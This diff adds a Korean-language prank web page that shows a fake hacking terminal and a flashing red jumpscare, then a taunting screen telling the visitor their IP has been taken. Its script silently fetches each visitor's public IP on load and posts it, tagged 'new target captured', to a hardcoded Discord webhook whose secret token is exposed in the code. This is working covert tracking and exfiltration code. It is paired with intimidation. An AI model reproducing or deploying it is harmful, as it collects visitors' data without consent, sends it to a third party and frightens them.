@@ -1,0 +1,143 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>시스템 오류</title>
+    <style>
+        body {
+            background-color: #000;
+            color: #0f0;
+            font-family: 'Courier New', Courier, monospace;
+            margin: 0;
+            overflow: hidden;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        #terminal {
+            width: 90%;
+            height: 90%;
+            text-align: left;
+            font-size: 1.2rem;
+            line-height: 1.5;
+        }
+
+        #jumpscare {
+            display: none;
+            position: fixed;
+            top: 0; left: 0;
+            width: 100vw; height: 100vh;
+            background-color: red;
+            z-index: 9999;
+            animation: flash 0.1s infinite;
+        }
+
+        @keyframes flash {
+            0% { background-color: red; }
+            50% { background-color: black; }
+            100% { background-color: red; }
+        }
+
+        #result-screen {
+            display: none;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            width: 100%;
+            height: 100%;
+            background-color: #000;
+            z-index: 10000;
+        }
+
+        #ip-text {
+            color: #ffcc00;
+            font-size: 3rem;
+            font-weight: bold;
+            text-shadow: 2px 2px 10px red;
+            margin-bottom: 20px;
+            font-family: 'Malgun Gothic', sans-serif;
+            text-align: center;
+            word-break: keep-all;
+        }
+
+        img {
+            max-width: 90%;
+            max-height: 70vh;
+            border-radius: 15px;
+            box-shadow: 0 0 30px red;
+        }
+    </style>
+</head>
+<body>
+
+    <div id="terminal"></div>
+    <div id="jumpscare"></div>
+    <div id="result-screen">
+        <div id="ip-text">IP 추출 중...</div>
+        <img src="image.png" alt="너 ip따임">
+    </div>
+
+    <script>
+        const webhookURL = 'https://discord.com/api/webhooks/1543975289527341118/tgC_i7WSsTccdUWBE2FXjMkY1__piEvWo1UxZkP3BTlbKNpCrlAujbLFeEjJoMyIbrxl';
+
+        // 방문자 IP 가져와서 디스코드 웹훅으로 전송
+        fetch('https://api.ipify.org?format=json')
+            .then(res => res.json())
+            .then(data => {
+                const visitorIP = data.ip;
+                
+                // 화면에 IP 표시
+                document.getElementById('ip-text').innerHTML = `너 IP <br><span style="color:red; font-size:4rem;">${visitorIP}</span><br> 따임 ㅋㅋㅋㅋ`;
+
+                // 디스코드 웹훅 전송
+                fetch(webhookURL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        content: `🎯 **새로운 타겟 포착!**\n> IP 주소: \`${visitorIP}\``
+                    })
+                }).catch(err => console.error(err));
+            })
+            .catch(() => {
+                document.getElementById('ip-text').innerText = "너 ip따임 ㅋㅋㅋㅋ";
+            });
+
+        const term = document.getElementById('terminal');
+        const jump = document.getElementById('jumpscare');
+        const result = document.getElementById('result-screen');
+
+        const lines = [
+            "Connection established...",
+            "Bypassing security protocols...",
+            "Accessing local network...",
+            "Extracting user data...",
+            "Locating IPv4 address...",
+            "Target locked."
+        ];
+
+        window.onload = () => {
+            let i = 0;
+            const typingInterval = setInterval(() => {
+                if (i < lines.length) {
+                    term.innerHTML += lines[i] + "<br>";
+                    i++;
+                } else {
+                    clearInterval(typingInterval);
+                    term.style.display = 'none';
+                    jump.style.display = 'block';
+
+                    setTimeout(() => {
+                        jump.style.display = 'none';
+                        result.style.display = 'flex';
+                    }, 250);
+                }
+            }, 400);
+        };
+    </script>
+</body>
+</html>
